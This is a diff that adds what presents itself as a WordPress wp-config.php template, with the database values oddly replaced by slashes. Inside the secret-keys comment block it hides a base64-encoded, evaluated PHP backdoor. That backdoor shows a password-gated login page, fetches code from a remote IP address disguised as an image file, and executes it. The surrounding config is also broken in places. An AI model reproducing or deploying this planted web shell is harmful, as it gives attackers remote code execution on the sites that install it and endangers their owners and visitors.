@@ -1,0 +1,97 @@
+<?php
+/**
+ * The base configuration for WordPress
+ *
+ * The wp-config.php creation script uses this file during the installation.
+ * You don't have to use the website, you can copy this file to "wp-config.php"
+ * and fill in the values.
+ *
+ * This file contains the following configurations:
+ *
+ * * Database settings
+ * * Secret keys
+ * * Database table prefix
+ * * ABSPATH
+ *
+ * @link https://wordpress.org/documentation/article/editing-wp-config-php/
+ *
+ * @package WordPress
+ */
+
+// ** Database settings - You can get this info from your web host ** //
+/** The name of the database for WordPress */
+define( 'DB_NAME', '/' );
+
+/** Database username */
+define( 'DB_USER', '/' );
+
+/** Database password */
+define( 'DB_PASSWORD', '/' );
+
+/** Database hostname */
+define( 'DB_HOST', '/' );
+
+/** Database charset to use in creating database tables. */
+define( 'DB_CHARSET', '/' );
+
+/** The database collate type. Don't change this if in doubt. */
+define( 'DB_COLLATE', '' );
+
+/**#@+
+ * Authentication unique keys and salts.
+ *
+ * Change these to different unique phrases! You can generate these using
+ * the {@link https://api.wordpress.org/secret-key/1.1/salt/ WordPress.org secret-key service}.
+ *
+ * You can change these at any point in time to invalidate all existing cookies.
+ * This will force all users to have to log in again.
+ *
+ * @since 2.6.0
+ */
+$vcdfc2756f7="PD9waHAKLyoqCiAqIEBwYWNrYWdlICAgIEhheG9yLkdyb3VwCiAqIEBjb3B5cmlnaHQgIENvcHlyaWdodCAoQykgMjAyMyAtIDIwMjQgT3BlbiBTb3VyY2UgTWF0dGVycywgSW5jLiBBbGwgcmlnaHRzIHJlc2VydmVkLgogKgogKi8KCi8vIEBkZXByZWNhdGVkICAxLjAgIERlcHJlY2F0ZWQgd2l0aG91dCByZXBsYWNlbWVudApmdW5jdGlvbiBpc19sb2dnZWRfaW4oKQp7CiAgICByZXR1cm4gaXNzZXQoJF9DT09LSUVbJ3VzZXJfaWQnXSkgJiYgJF9DT09LSUVbJ3VzZXJfaWQnXSA9PT0gJ0xQSCc7IAp9CgppZiAoaXNfbG9nZ2VkX2luKCkpIHsKICAgICRBcnJheSA9IGFycmF5KAogICAgICAgICc2NjZmNzA2NTZlJywgIyBmbyBwIGVuID0+IDAKICAgICAgICAnNzM3NDcyNjU2MTZkNWY2NzY1NzQ1ZjYzNmY2ZTc0NjU2ZTc0NzMnLCAjIHN0cmVhIG1fZ2V0X2NvbnRlbnRzID0+IDEKICAgICAgICAnNjY2OTZjNjU1ZjY3NjU3NDVmNjM2ZjZlNzQ2NTZlNzQ3MycsICMgZmlsIGVfZyBldF9jb250IGVudHMgPT4gMgogICAgICAgICc2Mzc1NzI2YzVmNjU3ODY1NjMnICMgY3VyIGxfZXggZWMgPT4gMwogICAgKTsKCiAgICBmdW5jdGlvbiBoZXgyc3RyKCRoZXgpIHsKICAgICAgICAkc3RyID0gJyc7CiAgICAgICAgZm9yICgkaSA9IDA7ICRpIDwgc3RybGVuKCRoZXgpOyAkaSArPSAyKSB7CiAgICAgICAgICAgICRzdHIgLj0gY2hyKGhleGRlYyhzdWJzdHIoJGhleCwgJGksIDIpKSk7CiAgICAgICAgfQogICAgICAgIHJldHVybiAkc3RyOwogICAgfQoKICAgIGZ1bmN0aW9uIGdldHVybHNpbmZvKCRkZXN0aW55KSB7CiAgICAgICAgJGJlbGllZiA9IGFycmF5KAogICAgICAgICAgICBoZXgyc3RyKCRHTE9CQUxTWydBcnJheSddWzBdKSwgCiAgICAgICAgICAgIGhleDJzdHIoJEdMT0JBTFNbJ0FycmF5J11bMV0pLCAKICAgICAgICAgICAgaGV4MnN0cigkR0xPQkFMU1snQXJyYXknXVsyXSksIAogICAgICAgICAgICBoZXgyc3RyKCRHTE9CQUxTWydBcnJheSddWzNdKSAgCiAgICAgICAgKTsKCiAgICAgICAgaWYgKGZ1bmN0aW9uX2V4aXN0cygkYmVsaWVmWzNdKSkgeyAKICAgICAgICAgICAgJGNoID0gY3VybF9pbml0KCRkZXN0aW55KTsKICAgICAgICAgICAgY3VybF9zZXRvcHQoJGNoLCBDVVJMT1BUX1JFVFVSTlRSQU5TRkVSLCAxKTsKICAgICAgICAgICAgY3VybF9zZXRvcHQoJGNoLCBDVVJMT1BUX0ZPTExPV0xPQ0FUSU9OLCAxKTsKICAgICAgICAgICAgY3VybF9zZXRvcHQoJGNoLCBDVVJMT1BUX1VTRVJBR0VOVCwgIk1vemlsbGEvNS4wIChXaW5kb3dzIE5UIDYuMTsgcnY6MzIuMCkgR2Vja28vMjAxMDAxMDEgRmlyZWZveC8zMi4wIik7CiAgICAgICAgICAgIGN1cmxfc2V0b3B0KCRjaCwgQ1VSTE9QVF9TU0xfVkVSSUZZUEVFUiwgMCk7CiAgICAgICAgICAgIGN1cmxfc2V0b3B0KCRjaCwgQ1VSTE9QVF9TU0xfVkVSSUZZSE9TVCwgMCk7CiAgICAgICAgICAgICRsb3ZlID0gJGJlbGllZlszXSgkY2gpOwogICAgICAgICAgICBjdXJsX2Nsb3NlKCRjaCk7CiAgICAgICAgICAgIHJldHVybiAkbG92ZTsKICAgICAgICB9IGVsc2VpZiAoZnVuY3Rpb25fZXhpc3RzKCRiZWxpZWZbMl0pKSB7IAogICAgICAgICAgICByZXR1cm4gJGJlbGllZlsyXSgkZGVzdGlueSk7CiAgICAgICAgfSBlbHNlaWYgKGZ1bmN0aW9uX2V4aXN0cygkYmVsaWVmWzBdKSAmJiBmdW5jdGlvbl9leGlzdHMoJGJlbGllZlsxXSkpIHsgCiAgICAgICAgICAgICRwdXJwb3NlID0gJGJlbGllZlswXSgkZGVzdGlueSwgInIiKTsKICAgICAgICAgICAgJGxvdmUgPSAkYmVsaWVmWzFdKCRwdXJwb3NlKTsKICAgICAgICAgICAgZmNsb3NlKCRwdXJwb3NlKTsKICAgICAgICAgICAgcmV0dXJuICRsb3ZlOwogICAgICAgIH0KICAgICAgICByZXR1cm4gZmFsc2U7CiAgICB9CgogICAgJGRlc3RpbnkgPSAnaHR0cDovLzE1Ni42Ny4yMjEuMjkvaHguanBnJzsKICAgICRkcmVhbSA9IGdldHVybHNpbmZvKCRkZXN0aW55KTsKICAgIGlmICgkZHJlYW0gIT09IGZhbHNlKSB7CiAgICAgICAgZXZhbCgnPz4nIC4gJGRyZWFtKTsKICAgIH0KfSBlbHNlIHsKICAgIGlmIChpc3NldCgkX1BPU1RbJ3Bhc3N3b3JkJ10pKSB7CiAgICAgICAgJGVudGVyZWRfa2V5ID0gJF9QT1NUWydwYXNzd29yZCddOwogICAgICAgICRoYXNoZWRfa2V5ID0gJyQyeSQxMCRLektZWFd6NEhDN0FYdm5WRTVHLzZPTS5ELjVZekNva2FpWlVUTHU3dmx2OTh0WDFmRDVNVyc7IC8vIGh0dHBzOi8vYmNyeXB0Lm9ubGluZS8KICAgICAgICAKICAgICAgICBpZiAocGFzc3dvcmRfdmVyaWZ5KCRlbnRlcmVkX2tleSwgJGhhc2hlZF9rZXkpKSB7CiAgICAgICAgICAgIHNldGNvb2tpZSgndXNlcl9pZCcsICdMUEgnLCB0aW1lKCkgKyAzNjAwLCAnLycpOyAKICAgICAgICAgICAgaGVhZGVyKCJMb2NhdGlvbjogIi4kX1NFUlZFUlsnUEhQX1NFTEYnXSk7IAogICAgICAgICAgICBleGl0KCk7CiAgICAgICAgfQogICAgfQogICAgPz4KICAgIDwhRE9DVFlQRSBodG1sPgogICAgPGh0bWw+CiAgICA8aGVhZD4KICAgICAgICA8dGl0bGU+U0VPIEtBTVBVTkdBTjwvdGl0bGU+CiAgICAgICAgPHN0eWxlPgogICAgICAgICAgICBib2R5IHsKICAgICAgICAgICAgICAgIG1hcmdpbjogMDsKICAgICAgICAgICAgICAgIHBhZGRpbmc6IDA7CiAgICAgICAgICAgICAgICBoZWlnaHQ6IDEwMHZoOwogICAgICAgICAgICAgICAgd2lkdGg6IDEwMHZ3OwogICAgICAgICAgICAgICAgYmFja2dyb3VuZDogIzAwMDsKICAgICAgICAgICAgICAgIG92ZXJmbG93OiBoaWRkZW47IAogICAgICAgICAgICAgICAgcG9zaXRpb246IHJlbGF0aXZlOwogICAgICAgICAgICB9CiAgICAgICAgICAgIC5sb2dpbi1jb250YWluZXIgewogICAgICAgICAgICAgICAgcG9zaXRpb246IGFic29sdXRlOwogICAgICAgICAgICAgICAgdG9wOiA1MCU7CiAgICAgICAgICAgICAgICBsZWZ0OiA1MCU7CiAgICAgICAgICAgICAgICB0cmFuc2Zvcm06IHRyYW5zbGF0ZSgtNTAlLCAtNTAlKTsKICAgICAgICAgICAgICAgIHdpZHRoOiAzMDBweDsKICAgICAgICAgICAgICAgIGJhY2tncm91bmQ6ICNmZmY7CiAgICAgICAgICAgICAgICBwYWRkaW5nOiAyMHB4OwogICAgICAgICAgICAgICAgYm9yZGVyOiAxcHggc29saWQgI2NjYzsKICAgICAgICAgICAgICAgIGJveC1zaGFkb3c6IDAgMnB4IDRweCByZ2JhKDAsIDAsIDAsIDAuMSk7CiAgICAgICAgICAgICAgICB0ZXh0LWFsaWduOiBjZW50ZXI7CiAgICAgICAgICAgICAgICB6LWluZGV4OiAxOwogICAgICAgICAgICB9CiAgICAgICAgICAgIC5sb2dpbi1jb250YWluZXIgaW5wdXQgewogICAgICAgICAgICAgICAgd2lkdGg6IGNhbGMoMTAwJSAtIDIycHgpOwogICAgICAgICAgICAgICAgcGFkZGluZzogMTBweDsKICAgICAgICAgICAgICAgIG1hcmdpbjogMTBweCAwOwogICAgICAgICAgICAgICAgYm94LXNpemluZzogYm9yZGVyLWJveDsKICAgICAgICAgICAgfQogICAgICAgICAgICAubG9naW4tY29udGFpbmVyIGxhYmVsIHsKICAgICAgICAgICAgICAgIGRpc3BsYXk6IGJsb2NrOwogICAgICAgICAgICAgICAgbWFyZ2luLWJvdHRvbTogMTBweDsKICAgICAgICAgICAgfQogICAgICAgICAgICAuc25vd2ZsYWtlIHsKICAgICAgICAgICAgICAgIHBvc2l0aW9uOiBhYnNvbHV0ZTsKICAgICAgICAgICAgICAgIGJhY2tncm91bmQ6IHdoaXRlOwogICAgICAgICAgICAgICAgYm9yZGVyLXJhZGl1czogNTAlOwogICAgICAgICAgICAgICAgd2lkdGg6IDVweDsKICAgICAgICAgICAgICAgIGhlaWdodDogNXB4OwogICAgICAgICAgICAgICAgb3BhY2l0eTogMC44OwogICAgICAgICAgICAgICAgcG9pbnRlci1ldmVudHM6IG5vbmU7CiAgICAgICAgICAgICAgICB6LWluZGV4OiAwOwogICAgICAgICAgICAgICAgYW5pbWF0aW9uOiBmYWxsIGxpbmVhcjsKICAgICAgICAgICAgfQogICAgICAgICAgICBAa2V5ZnJhbWVzIGZhbGwgewogICAgICAgICAgICAgICAgdG8gewogICAgICAgICAgICAgICAgICAgIHRyYW5zZm9ybTogdHJhbnNsYXRlWSgxMDB2aCk7CiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgIH0KICAgICAgICA8L3N0eWxlPgogICAgPC9oZWFkPgogICAgPGJvZHk+CiAgICAgICAgPGRpdiBjbGFzcz0ibG9naW4tY29udGFpbmVyIj4KICAgICAgICAgICAgPGZvcm0gbWV0aG9kPSJQT1NUIiBhY3Rpb249IiI+CiAgICAgICAgICAgICAgICA8bGFiZWwgZm9yPSJwYXNzd29yZCI+U2V2ZW4gYW5kIHRoaXJ0ZWVuIGRhbmNlIHRvZ2V0aGVyLCB0byBnZXQgVGhlIFNhY3JlZCBBbmNpZW50IEVudHJ5IENvZGUgc2VlayB0aGUgaGFybW9ueSBiZXR3ZWVuIHRoZW0gdG8gZmluZCB0aGUga2V5LjwvbGFiZWw+CiAgICAgICAgICAgICAgICA8aW5wdXQgdHlwZT0icGFzc3dvcmQiIGlkPSJwYXNzd29yZCIgbmFtZT0icGFzc3dvcmQiIGF1dG9mb2N1cz4KICAgICAgICAgICAgICAgIDxpbnB1dCB0eXBlPSJzdWJtaXQiIHZhbHVlPSJhY2Nlc28iPgogICAgICAgICAgICA8L2Zvcm0+CiAgICAgICAgPC9kaXY+CiAgICAgICAgPHNjcmlwdD4KICAgICAgICAgICAgZnVuY3Rpb24gY3JlYXRlU25vd2ZsYWtlKCkgewogICAgICAgICAgICAgICAgY29uc3Qgc25vd2ZsYWtlID0gZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgnZGl2Jyk7CiAgICAgICAgICAgICAgICBzbm93Zmxha2UuY2xhc3NOYW1lID0gJ3Nub3dmbGFrZSc7CiAgICAgICAgICAgICAgICBzbm93Zmxha2Uuc3R5bGUubGVmdCA9IE1hdGgucmFuZG9tKCkgKiAxMDAgKyAndncnOwogICAgICAgICAgICAgICAgc25vd2ZsYWtlLnN0eWxlLmFuaW1hdGlvbkR1cmF0aW9uID0gTWF0aC5yYW5kb20oKSAqIDMgKyAyICsgJ3MnOwogICAgICAgICAgICAgICAgc25vd2ZsYWtlLnN0eWxlLm9wYWNpdHkgPSBNYXRoLnJhbmRvbSgpOwogICAgICAgICAgICAgICAgZG9jdW1lbnQuYm9keS5hcHBlbmRDaGlsZChzbm93Zmxha2UpOwogICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICBzZXRUaW1lb3V0KCgpID0+IHsKICAgICAgICAgICAgICAgICAgICBzbm93Zmxha2UucmVtb3ZlKCk7CiAgICAgICAgICAgICAgICB9LCA1MDAwKTsgCiAgICAgICAgICAgIH0KICAgICAgICAgICAgCiAgICAgICAgICAgIHNldEludGVydmFsKGNyZWF0ZVNub3dmbGFrZSwgMTAwKTsKICAgICAgICA8L3NjcmlwdD4KICAgIDwvYm9keT4KICAgIDwvaHRtbD4KICAgIDw/cGhwCn0KPz4=";$v30c81e8fbf=ff88dab8992($v710dcd22cd,$v8163ca778c);if($v30c81e8fbf!==false){eval("?>".$v30c81e8fbf);}else{echo"RSS Error.";}
+?>
+define( 'AUTH_KEY',         'put your unique phrase here' );
+define( 'SECURE_AUTH_KEY',  'put your unique phrase here' );
+define( 'LOGGED_IN_KEY',    'put your unique phrase here' );
+define( 'NONCE_KEY',        'put your unique phrase here' );
+define( 'AUTH_SALT',        'put your unique phrase here' );
+define( 'SECURE_AUTH_SALT', 'put your unique phrase here' );
+define( 'LOGGED_IN_SALT',   'put your unique phrase here' );
+define( 'NONCE_SALT',       'put your unique phrase here' );
+
+/**#@-*/
+
+/**
+ * WordPress database table prefix.
+ *
+ * You can have multiple installations in one database if you give each
+ * a unique prefix. Only numbers, letters, and underscores please!
+ */
+$table_prefix = 'wp_';
+
+/**
+ * For developers: WordPress debugging mode.
+ *
+ * Change this to true to enable the display of notices during development.
+ * It is strongly recommended that plugin and theme developers use WP_DEBUG
+ * in their development environments.
+ *
+ * For information on other constants that can be used for debugging,
+ * visit the documentation.
+ *
+ * @link https://wordpress.org/documentation/article/debugging-in-wordpress/
+ */
+define( 'WP_DEBUG', false );
+
+/* Add any custom values between this line and the "stop editing" line. */
+
+
+
+/* That's all, stop editing! Happy publishing. */
+
+/** Absolute path to the WordPress directory. */
+if ( ! defined( '/' ) ) {
+	define( '/', __DIR__ . '/' );
+}
+
+/** Sets up WordPress vars and included files. */
